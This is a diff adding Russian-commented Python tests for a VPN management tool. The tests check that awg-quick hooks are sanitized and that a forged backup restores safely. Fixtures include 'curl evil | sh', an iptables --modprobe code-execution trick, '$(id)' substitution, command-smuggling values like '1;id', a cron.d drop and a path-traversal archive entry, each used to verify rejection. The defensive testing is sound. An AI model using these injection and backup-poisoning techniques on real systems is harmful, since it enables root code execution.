@@ -152,10 +152,19 @@ with open(TSV, "w") as f:
 rc, out, _ = bash(f'clients_tsv() {{ cat "{TSV}"; }}; clients_psv | {{ IFS="|" read -r name pub aip exp orig rest; echo "$exp|$orig|$rest"; }}')
 chk("clients_psv: пустая колонка остаётся пустой", out.strip() == "1800000000||none", out)
 
-# Валидаторы: ведущие нули — не восьмеричные числа и не ошибка арифметики
-rc, out, err = bash('valid_port 0080 && echo a; valid_port 65536 || echo b; valid_port 0 || echo c; '
-                    'valid_cidr 10.0.0.0/08 && echo d; valid_cidr 10.0.0.0/33 || echo e')
-chk("valid_port/valid_cidr с ведущими нулями", out.split() == ["a", "b", "c", "d", "e"] and "too great" not in err, out + err)
+# Мастер создания сервера: регион — выбором 1/2, Enter и Ctrl+D — Европа / мир
+picked = [bash('_choose_region; echo "R=$S_REGION"', stdin=s)[1].strip().splitlines()[-1] for s in ("2\n", "\n", "")]
+chk("регион сервера: 2 — Россия, Enter и Ctrl+D — мир", picked == ["R=ru", "R=world", "R=world"], picked)
+rc, out, _ = bash('S_NET=""; _choose_net; echo "N=$S_NET"', stdin="2\n\n")
+chk("подсеть вручную: пустой ввод — случайная, мастер не обрывается",
+    rc == 0 and re.search(r"N=10\.\d+\.\d+\.0/24$", out.strip()), out)
+
+# Валидаторы: ведущие нули — отказ, а не восьмеричное число или ошибка арифметики
+rc, out, err = bash('valid_port 0080 || echo a; valid_port 65536 || echo b; valid_port 0 || echo c; '
+                    'valid_cidr 10.0.0.0/08 || echo d; valid_cidr 10.0.0.0/33 || echo e; '
+                    'valid_port 80 && valid_port 65535 && valid_cidr 10.0.0.0/0 && valid_cidr 10.8.0.0/24 && echo f')
+chk("valid_port/valid_cidr: ведущие нули — отказ без ошибки bash", out.split() == ["a", "b", "c", "d", "e", "f"]
+    and "too great" not in err and "syntax error" not in err, out + err)
 
 WG = os.path.join(ROOT, "etc/wireguard/wgobf0.conf")
 os.makedirs(os.path.dirname(WG), exist_ok=True)
@@ -615,6 +624,113 @@ chk("восстановление из архива", r.get("ok") and "Восс�
 chk("restore: конфиг клиента не из бэкапа убран, остальные на месте",
     not os.path.exists(LATE) and os.path.exists(ALICE)
     and not any(c["name"] == "late" for c in api("clients", "list").get("data") or []), os.listdir(os.path.join(ROOT, "root")))
+
+# Хуки awg-quick выполняются от root. Свои команды Тулзы (1.x и 0.8) проходят,
+# чужие и iptables --modprobe (запускает любую программу) — нет.
+HOOKS = os.path.join(TMP, "hooks.conf")
+rc, out, _ = bash(f'{{ echo "[Interface]"; _postup_lines 10.8.0.0/24 eth0; '
+                  'echo "PostUp = ip link set dev awg0 mtu 1320; echo 1 > /proc/sys/net/ipv4/ip_forward; '
+                  'iptables -t nat -C POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE >/dev/null 2>&1 || '
+                  'iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE"; '
+                  f'}} > "{HOOKS}"; py conf-hooks "{HOOKS}" check')
+chk("хуки Тулзы (1.x и 0.8) — допустимы", rc == 0 and out == "", out)
+with open(HOOKS, "w") as f:
+    f.write("[Interface]\nPostUp = iptables -A INPUT -p tcp --dport 2222 -j ACCEPT; touch /tmp/x; "
+            "iptables -C X 2>/dev/null || curl evil | sh\nPreUp = iptables --modp=/tmp/x -L\n"
+            "PreDown = ip6tables -M /tmp/x -L\nPostDown = iptables -L $(id)\nSaveConfig = true\n"
+            "\n[Peer]\nPublicKey = P\n")
+rc, out, _ = bash(f'py conf-hooks "{HOOKS}" fix')
+bad = out.splitlines()
+chk("недопустимые команды названы: чужие, --modprobe, подстановка, SaveConfig",
+    rc == 0 and "PostUp\ttouch /tmp/x" in bad and "PostUp\tiptables -C X 2>/dev/null || curl evil | sh" in bad
+    and "PreUp\tiptables --modp=/tmp/x -L" in bad and "PreDown\tip6tables -M /tmp/x -L" in bad
+    and "PostDown\tiptables -L $(id)" in bad and "SaveConfig\tSaveConfig = true" in bad and len(bad) == 6, out)
+with open(HOOKS) as f:
+    fixed = f.read()
+chk("в файле — только допустимое, [Peer] не тронут",
+    fixed == "[Interface]\nPostUp = iptables -A INPUT -p tcp --dport 2222 -j ACCEPT\n\n[Peer]\nPublicKey = P\n", fixed)
+WGC = os.path.join(ROOT, "etc/wireguard/wgobf0.conf")
+os.makedirs(os.path.dirname(WGC), exist_ok=True)
+with open(WGC, "w") as f:
+    f.write("[Interface]\nPrivateKey = X\nPostUp = touch /tmp/x\npostdown = /old/fw.sh down\nListenPort = 1\n")
+rc, out, _ = bash('_wgobf_hooks_reset 2>&1; echo "==="; cat "$WGOBF_WG_CONF"; echo "FW=$WGOBF_FW"')
+said, rest = out.split("===", 1)
+conf_text, fw = rest.rsplit("FW=", 1)
+fw = fw.strip()
+chk("wgobf0 из бэкапа: хуки — ровно скрипт Тулзы, о чужих — предупреждение",
+    conf_text.strip() == f"[Interface]\nPostUp = {fw} up\nPostDown = {fw} down\nPrivateKey = X\nListenPort = 1"
+    and "чужие команды" in said and "touch /tmp/x" in said and "/old/fw.sh down" in said, out)
+
+# Подделанный бэкап: в awg0.conf — команды не из Тулзы, в архиве туннелей —
+# файл вне путей Тулзы, exit-нода с хуком, мусор в каскаде и tun2socks,
+# чужой toml dnscrypt-proxy; в каталоге WARP — «скрипт автозапуска».
+# Прежде tunnels.tar.gz распаковывался прямо в / как есть.
+import io
+import shutil
+import tarfile
+EVIL = os.path.join(TMP, "evil")
+shutil.rmtree(EVIL, ignore_errors=True)
+with tarfile.open(bk_path) as t:
+    t.extractall(EVIL)
+top = os.path.join(EVIL, os.listdir(EVIL)[0])
+with open(os.path.join(top, "awg0.conf")) as f:
+    srv = f.read()
+srv = srv.replace("[Interface]\n", "[Interface]\nPostUp = iptables -A INPUT -p tcp --dport 2222 -j ACCEPT; "
+                  f"touch {TMP}/pwned\nSaveConfig = true\n", 1)
+with open(os.path.join(top, "awg0.conf"), "w") as f:
+    f.write(srv)
+os.makedirs(os.path.join(top, "warp/wgcf"), exist_ok=True)
+for name, body in (("warp-autostart.sh", f"#!/bin/sh\ntouch {TMP}/pwned\n"), ("wgcf-account.toml", "acct\n")):
+    with open(os.path.join(top, "warp/wgcf", name), "w") as f:
+        f.write(body)
+AWGD = os.path.join(ROOT, "etc/amnezia/amneziawg")
+members = {
+    os.path.join(ROOT, "etc/cron.d/evil"): "* * * * * root touch /tmp/pwned\n",
+    os.path.join(AWGD, "awg-exit-n2.conf"): "[Interface]\nPrivateKey = X\nAddress = 10.9.0.2/32\n"
+                                            f"PostUp = touch {TMP}/pwned\n\n[Peer]\nPublicKey = P\n"
+                                            "Endpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0\n",
+    os.path.join(AWGD, "awg-exit-../x.conf"): "[Interface]\n",
+    os.path.join(ROOT, "etc/awg-cascade/rules.conf"): "udp|4443|5.6.7.8|443|ok\nudp|1;id|5.6.7.8|443|bad\n",
+    os.path.join(ROOT, "etc/tun2socks/proxy.txt"): "127.0.0.1:1080;touch x\n",
+    os.path.join(ROOT, "etc/dnscrypt-proxy/dnscrypt-proxy.toml"):
+        "server_names = ['quad9-doh-ip4-port443-nofilter-pri']\n[query_log]\n  file = '/etc/cron.d/x'\n",
+}
+with tarfile.open(os.path.join(top, "tunnels.tar.gz"), "w:gz") as t:
+    for path, body in members.items():
+        data = body.encode()
+        ti = tarfile.TarInfo(path.lstrip("/"))
+        ti.size = len(data)
+        t.addfile(ti, io.BytesIO(data))
+EVIL_TGZ = os.path.join(TMP, "evil_backup.tar.gz")
+with tarfile.open(EVIL_TGZ, "w:gz") as t:
+    t.add(top, arcname=os.path.basename(top))
+r = api("backup", "restore", EVIL_TGZ, "tunnels")
+log = r.get("log", "")
+with open(os.path.join(AWGD, "awg0.conf")) as f:
+    srv = f.read()
+chk("restore чужого бэкапа: из awg0.conf убраны команды не из Тулзы, о них — в итоге",
+    r.get("ok") and "Команды убраны" in log and "pwned" in log and "--dport 2222" in srv
+    and "pwned" not in srv and "SaveConfig" not in srv, [log[-600:], srv[:300]])
+chk("архив туннелей не распаковывается в /: файл вне путей Тулзы не появился",
+    not os.path.exists(os.path.join(ROOT, "etc/cron.d/evil")) and not os.path.exists("/etc/cron.d/evil"))
+EXIT2 = os.path.join(AWGD, "awg-exit-n2.conf")
+with open(EXIT2) as f:
+    ex2 = f.read()
+chk("exit-нода из бэкапа — без хуков, с Table = off", "PostUp" not in ex2 and "Table = off" in ex2
+    and not os.path.exists(os.path.join(AWGD, "x.conf")), ex2)
+with open(os.path.join(ROOT, "etc/awg-cascade/rules.conf")) as f:
+    rules = f.read()
+chk("каскад из бэкапа — только строки по формату", rules == "udp|4443|5.6.7.8|443|ok\n", rules)
+chk("адрес tun2socks не по формату не восстановлен", not os.path.exists(os.path.join(ROOT, "etc/tun2socks/proxy.txt")))
+with open(os.path.join(ROOT, "etc/dnscrypt-proxy/dnscrypt-proxy.toml")) as f:
+    toml = f.read()
+chk("dnscrypt-proxy — шаблон Тулзы, из бэкапа только резолверы",
+    "AWG Toolza" in toml and "server_names = ['quad9-doh-ip4-port443-nofilter-pri']" in toml
+    and "query_log" not in toml and "cron" not in toml, toml)
+chk("WARP: данные аккаунта — да, скрипт автозапуска из бэкапа — нет",
+    os.path.exists(os.path.join(ROOT, "etc/wgcf/wgcf-account.toml"))
+    and not os.path.exists(os.path.join(ROOT, "etc/wgcf/warp-autostart.sh")))
+chk("ничего из бэкапа не выполнилось", not os.path.exists(os.path.join(TMP, "pwned")))
 
 print("Сертификат")
 fake_acme()
